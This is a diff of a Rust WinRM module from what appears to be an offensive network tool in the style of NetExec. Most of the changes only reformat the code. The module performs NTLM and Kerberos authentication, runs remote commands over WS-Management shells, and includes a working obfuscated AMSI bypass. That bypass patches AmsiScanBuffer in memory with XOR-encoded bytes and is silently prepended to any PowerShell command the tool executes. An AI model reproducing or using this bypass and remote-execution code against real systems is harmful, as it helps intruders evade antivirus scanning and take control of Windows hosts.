@@ -7,12 +7,12 @@
 use crate::{CommandOutput, NxcProtocol, NxcSession};
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
-use nxc_auth::{AuthResult, Credentials, kerberos::KerberosClient};
+use base64::{engine::general_purpose, Engine as _};
+use nxc_auth::{kerberos::KerberosClient, AuthResult, Credentials};
 use reqwest::Client;
 use std::time::Duration;
 use tracing::{debug, info};
 use uuid::Uuid;
-use base64::{Engine as _, engine::general_purpose};
 
 // ─── WinRM Session ────────────────────────────────────────────────
 
@@ -78,7 +78,9 @@ impl WinrmProtocol {
             builder = builder.proxy(proxy);
         }
 
-        builder.build().map_err(|e| anyhow!("Failed to build HTTP client: {}", e))
+        builder
+            .build()
+            .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))
     }
 }
 
@@ -106,7 +108,12 @@ impl NxcProtocol for WinrmProtocol {
         &["sam", "lsa"] // Stub modules matching the reference
     }
 
-    async fn connect(&self, target: &str, port: u16, proxy: Option<&str>) -> Result<Box<dyn NxcSession>> {
+    async fn connect(
+        &self,
+        target: &str,
+        port: u16,
+        proxy: Option<&str>,
+    ) -> Result<Box<dyn NxcSession>> {
         let url = self.build_url(target, port);
         debug!("WinRM: Connecting to {} (proxy: {:?})", url, proxy);
 
@@ -187,127 +194,171 @@ impl NxcProtocol for WinrmProtocol {
         session: &mut dyn NxcSession,
         creds: &Credentials,
     ) -> Result<AuthResult> {
-        let winrm_sess = session.as_any_mut().downcast_mut::<WinrmSession>().ok_or_else(|| anyhow::anyhow!("Invalid session type"))?;
+        let winrm_sess = session
+            .as_any_mut()
+            .downcast_mut::<WinrmSession>()
+            .ok_or_else(|| anyhow::anyhow!("Invalid session type"))?;
         let url = self.build_url(&winrm_sess.target, winrm_sess.port);
         let client = self.build_client(winrm_sess.proxy.as_deref())?;
 
         debug!("WinRM: Authenticating {}@{}", creds.username, url);
 
         if creds.use_kerberos {
-            debug!("WinRM: Authenticating {} via Kerberos (Negotiate)", creds.username);
+            debug!(
+                "WinRM: Authenticating {} via Kerberos (Negotiate)",
+                creds.username
+            );
             return self.authenticate_kerberos(winrm_sess, creds).await;
         }
 
         // NTLM Handshake over HTTP
         let auth = nxc_auth::NtlmAuthenticator::new(creds.domain.as_deref());
-        let t1_base64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, auth.generate_type1());
+        let t1_base64 = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            auth.generate_type1(),
+        );
 
-        let resp = client.post(&url)
+        let resp = client
+            .post(&url)
             .header("Authorization", format!("Negotiate {}", t1_base64))
             .header("Content-Length", "0")
-            .send().await?;
+            .send()
+            .await?;
 
         if resp.status() != reqwest::StatusCode::UNAUTHORIZED {
-             return Ok(AuthResult::failure("Server did not challenge with 401", None));
+            return Ok(AuthResult::failure(
+                "Server did not challenge with 401",
+                None,
+            ));
         }
 
-        let www_auth = resp.headers().get("WWW-Authenticate").and_then(|h| h.to_str().ok()).unwrap_or("");
-        let t2_base64 = www_auth.strip_prefix("Negotiate ").or(www_auth.strip_prefix("NTLM ")).ok_or_else(|| anyhow!("No NTLM challenge found"))?;
+        let www_auth = resp
+            .headers()
+            .get("WWW-Authenticate")
+            .and_then(|h| h.to_str().ok())
+            .unwrap_or("");
+        let t2_base64 = www_auth
+            .strip_prefix("Negotiate ")
+            .or(www_auth.strip_prefix("NTLM "))
+            .ok_or_else(|| anyhow!("No NTLM challenge found"))?;
         let t2_msg = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, t2_base64)?;
-        
+
         let challenge = auth.parse_type2(&t2_msg)?;
         let t3_msg = auth.generate_type3(creds, &challenge)?;
-        let t3_base64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, t3_msg.message);
+        let t3_base64 =
+            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, t3_msg.message);
 
         // Final Auth check with a dummy header or small SOAP probe
-        let probe_resp = client.post(&url)
+        let probe_resp = client
+            .post(&url)
             .header("Authorization", format!("Negotiate {}", t3_base64))
             .header("Content-Type", "application/soap+xml;charset=UTF-8")
             .body(self.build_create_shell_soap())
-            .send().await?;
+            .send()
+            .await?;
 
         if probe_resp.status().is_success() {
             debug!("WinRM: Auth successful for {}", creds.username);
             // We'll store the T3 token if needed, or subsequent requests will re-auth (simplified for now)
             Ok(AuthResult::success(true))
         } else {
-            Ok(AuthResult::failure(&format!("Auth failed with status {}", probe_resp.status()), None))
+            Ok(AuthResult::failure(
+                &format!("Auth failed with status {}", probe_resp.status()),
+                None,
+            ))
         }
     }
 
     async fn execute(&self, session: &dyn NxcSession, cmd: &str) -> Result<CommandOutput> {
-         let winrm_sess = session.as_any().downcast_ref::<WinrmSession>().ok_or_else(|| anyhow::anyhow!("Invalid session type"))?;
-         let url = &winrm_sess.endpoint;
-         let client = self.build_client(winrm_sess.proxy.as_deref())?;
-         
-         // For an offensive tool, we inject AMSI and ETW bypasses into the command if it's PowerShell.
-         let final_cmd = if cmd.to_lowercase().starts_with("powershell") {
-             self.prepend_bypass(cmd)
-         } else {
-             cmd.to_string()
-         };
+        let winrm_sess = session
+            .as_any()
+            .downcast_ref::<WinrmSession>()
+            .ok_or_else(|| anyhow::anyhow!("Invalid session type"))?;
+        let url = &winrm_sess.endpoint;
+        let client = self.build_client(winrm_sess.proxy.as_deref())?;
 
-         debug!("WinRM: Executing command: {}", final_cmd);
+        // For an offensive tool, we inject AMSI and ETW bypasses into the command if it's PowerShell.
+        let final_cmd = if cmd.to_lowercase().starts_with("powershell") {
+            self.prepend_bypass(cmd)
+        } else {
+            cmd.to_string()
+        };
 
-         // 1. Create Shell
-         let create_soap = self.build_create_shell_soap();
-         let resp = client.post(url)
-             .header("Content-Type", "application/soap+xml;charset=UTF-8")
-             .body(create_soap)
-             .send().await?;
-         let body = resp.text().await?;
-         let shell_id = self.extract_xml_tag(&body, "rsp:ShellId").ok_or_else(|| anyhow!("Failed to extract ShellId"))?;
+        debug!("WinRM: Executing command: {}", final_cmd);
 
-         // 2. Run Command
-         let command_soap = self.build_command_soap(&shell_id, &final_cmd);
-         let resp = client.post(url)
-             .header("Content-Type", "application/soap+xml;charset=UTF-8")
-             .body(command_soap)
-             .send().await?;
-         let body = resp.text().await?;
-         let command_id = self.extract_xml_tag(&body, "rsp:CommandId").ok_or_else(|| anyhow!("Failed to extract CommandId"))?;
+        // 1. Create Shell
+        let create_soap = self.build_create_shell_soap();
+        let resp = client
+            .post(url)
+            .header("Content-Type", "application/soap+xml;charset=UTF-8")
+            .body(create_soap)
+            .send()
+            .await?;
+        let body = resp.text().await?;
+        let shell_id = self
+            .extract_xml_tag(&body, "rsp:ShellId")
+            .ok_or_else(|| anyhow!("Failed to extract ShellId"))?;
 
-         // 3. Receive Output (Poll)
-         let mut stdout = String::new();
-         let stderr = String::new();
-         loop {
-             let receive_soap = self.build_receive_soap(&shell_id, &command_id);
-             let resp = client.post(url)
-                 .header("Content-Type", "application/soap+xml;charset=UTF-8")
-                 .body(receive_soap)
-                 .send().await?;
-             let body = resp.text().await?;
-             
-             if let Some(out) = self.extract_xml_tag(&body, "rsp:Stream") {
-                 let decoded = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, out)?;
-                 stdout.push_str(&String::from_utf8_lossy(&decoded));
-             }
+        // 2. Run Command
+        let command_soap = self.build_command_soap(&shell_id, &final_cmd);
+        let resp = client
+            .post(url)
+            .header("Content-Type", "application/soap+xml;charset=UTF-8")
+            .body(command_soap)
+            .send()
+            .await?;
+        let body = resp.text().await?;
+        let command_id = self
+            .extract_xml_tag(&body, "rsp:CommandId")
+            .ok_or_else(|| anyhow!("Failed to extract CommandId"))?;
 
-             if body.contains("CommandState=\"Done\"") {
-                 break;
-             }
-             tokio::time::sleep(Duration::from_millis(500)).await;
-         }
+        // 3. Receive Output (Poll)
+        let mut stdout = String::new();
+        let stderr = String::new();
+        loop {
+            let receive_soap = self.build_receive_soap(&shell_id, &command_id);
+            let resp = client
+                .post(url)
+                .header("Content-Type", "application/soap+xml;charset=UTF-8")
+                .body(receive_soap)
+                .send()
+                .await?;
+            let body = resp.text().await?;
 
-         // 4. Cleanup Shell
-         let delete_soap = self.build_delete_shell_soap(&shell_id);
-         let _ = client.post(url)
-             .header("Content-Type", "application/soap+xml;charset=UTF-8")
-             .body(delete_soap)
-             .send().await?;
-         
-         Ok(CommandOutput {
-             stdout,
-             stderr,
-             exit_code: Some(0),
-         })
+            if let Some(out) = self.extract_xml_tag(&body, "rsp:Stream") {
+                let decoded =
+                    base64::Engine::decode(&base64::engine::general_purpose::STANDARD, out)?;
+                stdout.push_str(&String::from_utf8_lossy(&decoded));
+            }
+
+            if body.contains("CommandState=\"Done\"") {
+                break;
+            }
+            tokio::time::sleep(Duration::from_millis(500)).await;
+        }
+
+        // 4. Cleanup Shell
+        let delete_soap = self.build_delete_shell_soap(&shell_id);
+        let _ = client
+            .post(url)
+            .header("Content-Type", "application/soap+xml;charset=UTF-8")
+            .body(delete_soap)
+            .send()
+            .await?;
+
+        Ok(CommandOutput {
+            stdout,
+            stderr,
+            exit_code: Some(0),
+        })
     }
 }
 
 impl WinrmProtocol {
     fn build_create_shell_soap(&self) -> String {
         let message_id = Uuid::new_v4().to_string();
-        format!(r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
+        format!(
+            r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
   <s:Header>
     <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
     <a:MessageID>uuid:{message_id}</a:MessageID>
@@ -324,12 +375,14 @@ impl WinrmProtocol {
       <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
     </rsp:Shell>
   </s:Body>
-</s:Envelope>"#)
+</s:Envelope>"#
+        )
     }
 
     fn build_command_soap(&self, shell_id: &str, cmd: &str) -> String {
         let message_id = Uuid::new_v4().to_string();
-        format!(r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
+        format!(
+            r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
   <s:Header>
     <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
     <a:MessageID>uuid:{message_id}</a:MessageID>
@@ -341,12 +394,14 @@ impl WinrmProtocol {
   <s:Body>
     <rsp:CommandLine><rsp:Command>"{cmd}"</rsp:Command></rsp:CommandLine>
   </s:Body>
-</s:Envelope>"#)
+</s:Envelope>"#
+        )
     }
 
     fn build_receive_soap(&self, shell_id: &str, command_id: &str) -> String {
         let message_id = Uuid::new_v4().to_string();
-        format!(r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
+        format!(
+            r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
   <s:Header>
     <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>
     <a:MessageID>uuid:{message_id}</a:MessageID>
@@ -357,12 +412,14 @@ impl WinrmProtocol {
   <s:Body>
     <rsp:Receive><rsp:DesiredStream CommandId="{command_id}">stdout stderr</rsp:DesiredStream></rsp:Receive>
   </s:Body>
-</s:Envelope>"#)
+</s:Envelope>"#
+        )
     }
 
     fn build_delete_shell_soap(&self, shell_id: &str) -> String {
         let message_id = Uuid::new_v4().to_string();
-        format!(r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
+        format!(
+            r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
   <s:Header>
     <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action>
     <a:MessageID>uuid:{message_id}</a:MessageID>
@@ -371,13 +428,14 @@ impl WinrmProtocol {
     <w:SelectorSet><w:Selector Name="ShellId">{shell_id}</w:Selector></w:SelectorSet>
   </s:Header>
   <s:Body/>
-</s:Envelope>"#)
+</s:Envelope>"#
+        )
     }
 
     fn extract_xml_tag(&self, xml: &str, tag: &str) -> Option<String> {
         let start_tag = format!("<{}", tag);
         let end_tag = format!("</{}", tag);
-        
+
         if let Some(start_pos) = xml.find(&start_tag) {
             if let Some(content_start) = xml[start_pos..].find('>') {
                 let real_start = start_pos + content_start + 1;
@@ -401,13 +459,20 @@ impl WinrmProtocol {
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 ";
 "#);
-        script.push_str(r#"$k32 = Add-Type -MemberDefinition $md -Name 'k32' -Namespace 'W32' -PassThru;
-"#);
-        script.push_str(r#"$ad = $k32::GetModuleHandle("ams" + "i.dl" + "l");
-"#);
-        script.push_str(r#"$asb = $k32::GetProcAddress($ad, "Amsi" + "Scan" + "Buffer");
-"#);
-        script.push_str(r#"$p = 0;
+        script.push_str(
+            r#"$k32 = Add-Type -MemberDefinition $md -Name 'k32' -Namespace 'W32' -PassThru;
+"#,
+        );
+        script.push_str(
+            r#"$ad = $k32::GetModuleHandle("ams" + "i.dl" + "l");
+"#,
+        );
+        script.push_str(
+            r#"$asb = $k32::GetProcAddress($ad, "Amsi" + "Scan" + "Buffer");
+"#,
+        );
+        script.push_str(
+            r#"$p = 0;
 $k32::VirtualProtect($asb, [uint32]5, 0x40, [ref]$p);
 $b = New-Object Byte[] 8;
 $b[0] = 0xB9 -bxor 1;
@@ -420,39 +485,47 @@ $b[6] = 0x19 -bxor 1;
 $b[7] = 0x01 -bxor 1;
 [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $asb, 8);
 $k32::VirtualProtect($asb, [uint32]5, $p, [ref]$p);
-"#);
-        
+"#,
+        );
+
         let bypass_inline = script.replace('\n', " ").replace("\r", "");
-        
+
         // Wrap original cmd. If it was `powershell -c "some script"`, we insert the bypass first.
         let original = cmd.trim_start_matches("powershell").trim();
-        let original = original.trim_start_matches("-c").trim_start_matches("-Command").trim();
-        
+        let original = original
+            .trim_start_matches("-c")
+            .trim_start_matches("-Command")
+            .trim();
+
         format!("powershell -c \"{}; {}\"", bypass_inline, original)
     }
 
     /// Perform Kerberos authentication over WinRM (HTTP Negotiate)
-    async fn authenticate_kerberos(&self, winrm_sess: &mut WinrmSession, creds: &Credentials) -> Result<AuthResult> {
+    async fn authenticate_kerberos(
+        &self,
+        winrm_sess: &mut WinrmSession,
+        creds: &Credentials,
+    ) -> Result<AuthResult> {
         let domain = creds.domain.as_deref().unwrap_or("DOMAIN");
         let kdc_ip = &winrm_sess.target; // In real scenarios, this might be a different DC IP
 
         let krb_client = KerberosClient::new(domain, kdc_ip);
-        
+
         // 1. Request TGT
         let tgt = krb_client.request_tgt_with_creds(creds).await?;
-        
+
         // 2. Request TGS for HTTP service
         let spn = format!("HTTP/{}", winrm_sess.target);
         let tgs = krb_client.request_tgs(&tgt, &spn).await?;
-        
+
         // 3. Build AP-REQ
         let ap_req = krb_client.build_ap_req(&tgs)?;
         let token = general_purpose::STANDARD.encode(ap_req);
-        
+
         // 4. Send Negotiate request
         let url = self.build_url(&winrm_sess.target, winrm_sess.port);
         let client = self.build_client(winrm_sess.proxy.as_deref())?;
-        
+
         let request = client
             .post(&url)
             .header("Content-Length", "0")
@@ -463,7 +536,12 @@ $k32::VirtualProtect($asb, [uint32]5, $p, [ref]$p);
 
         let response = match request.send().await {
             Ok(resp) => resp,
-            Err(e) => return Ok(AuthResult::failure(&format!("HTTP connection failed: {}", e), None)),
+            Err(e) => {
+                return Ok(AuthResult::failure(
+                    &format!("HTTP connection failed: {}", e),
+                    None,
+                ))
+            }
         };
 
         if response.status().is_success() || response.status().as_u16() == 405 {
@@ -471,10 +549,15 @@ $k32::VirtualProtect($asb, [uint32]5, $p, [ref]$p);
             debug!("WinRM: Kerberos Auth successful for {}", creds.username);
             Ok(AuthResult::success(true))
         } else if response.status().as_u16() == 401 {
-            Ok(AuthResult::failure("Kerberos authentication failed (401 Unauthorized)", None))
+            Ok(AuthResult::failure(
+                "Kerberos authentication failed (401 Unauthorized)",
+                None,
+            ))
         } else {
-             Ok(AuthResult::failure(&format!("Unexpected status code: {}", response.status()), None))
+            Ok(AuthResult::failure(
+                &format!("Unexpected status code: {}", response.status()),
+                None,
+            ))
         }
     }
 }
-
